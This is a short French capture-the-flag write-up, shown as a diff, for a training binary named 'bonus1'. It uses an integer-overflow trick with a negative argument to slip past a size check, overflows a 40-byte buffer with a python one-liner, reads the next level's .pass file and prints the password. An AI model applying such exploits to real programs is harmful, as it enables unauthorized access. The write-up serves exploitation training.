@@ -1,0 +1,10 @@
+on peut voir avec gdb qu'un memcpy verifie si un atoi de argv[1] vaut moin de 9
+et nous "empeche" d'overflow, ok, on va underflow alors :)
+
+-2147483632 * 4 = 64
+
+le buffer fait 40, on va ecrire JUSTE apres (en le remplissant de A) notre nombre en dur.
+
+./bonus1 -2147483632 `python -c "print('A' * 40 + '\x57\x4f\x4c\x46'[::-1])"`
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
